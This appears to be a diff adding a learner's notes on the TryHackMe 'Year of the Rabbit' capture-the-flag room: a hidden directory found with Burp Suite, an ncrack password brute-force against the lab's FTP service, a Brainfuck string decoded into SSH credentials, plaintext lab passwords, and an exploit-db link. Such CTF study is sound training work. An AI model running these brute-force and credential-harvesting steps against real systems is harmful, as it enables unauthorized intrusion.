@@ -1,0 +1,62 @@
+page -> /sup3r_s3cr3t_fl4g.php
+page burpsuite intercepted found! ->/intermediary.php?hidden_directory=/WExYY2Cv-qU
+
+-----------------------------------------------------------------------------------
+
+				FTP
+ftp username: ftpuser
+
+
+┌──(kali㉿kali)-[~/Fer/tryhackme/yearOfTheRabbit]
+└─$ ncrack -u ftpuser -P ftppasswrds.txt ftp://10.10.54.6    
+
+Starting Ncrack 0.7 ( http://ncrack.org ) at 2021-08-30 00:15 UTC
+
+Discovered credentials for ftp on 10.10.54.6 21/tcp:
+10.10.54.6 21/tcp ftp: 'ftpuser' '5iez1wGXKfPKQ'
+
+Ncrack done: 1 service scanned in 33.01 seconds.
+
+Ncrack finished.
+
+i've never used ncrack, wow! could have tried to script this one out but i'm a noob :(
+
+-----------------------------------------------------------------------------------
+
+				SSH
+
+possible username -> eli
+
+This is Brainfuck code, thank god i've seen this somewhere else otherwise i'd be stuck for sure!
+
++++++ ++++[ ->+++ +++++ +<]>+ +++.< +++++ [->++ +++<] >++++ +.<++ +[->-
+--<]> ----- .<+++ [->++ +<]>+ +++.< +++++ ++[-> ----- --<]> ----- --.<+
+++++[ ->--- --<]> -.<++ +++++ +[->+ +++++ ++<]> +++++ .++++ +++.- --.<+
++++++ +++[- >---- ----- <]>-- ----- ----. ---.< +++++ +++[- >++++ ++++<
+]>+++ +++.< ++++[ ->+++ +<]>+ .<+++ +[->+ +++<] >++.. ++++. ----- ---.+
+++.<+ ++[-> ---<] >---- -.<++ ++++[ ->--- ---<] >---- --.<+ ++++[ ->---
+--<]> -.<++ ++++[ ->+++ +++<] >.<++ +[->+ ++<]> +++++ +.<++ +++[- >++++
++<]>+ +++.< +++++ +[->- ----- <]>-- ----- -.<++ ++++[ ->+++ +++<] >+.<+
+++++[ ->--- --<]> ---.< +++++ [->-- ---<] >---. <++++ ++++[ ->+++ +++++
+<]>++ ++++. <++++ +++[- >---- ---<] >---- -.+++ +.<++ +++++ [->++ +++++
+<]>+. <+++[ ->--- <]>-- ---.- ----. <
+
+Used this as decoder
+	https://www.dcode.fr/brainfuck-language
+	
+got:
+	Console
+	-----------------------
+	User: eli
+	Password: DSpDiM1wAEwid
+	-----------------------
+	Memory:
+	[1] = d (100)	
+
+
+
+SSH
+usser: Gwendoline
+pass: MniVCQVhQHUNI
+
+maybe exploit this https://www.exploit-db.com/exploits/41240 ? 
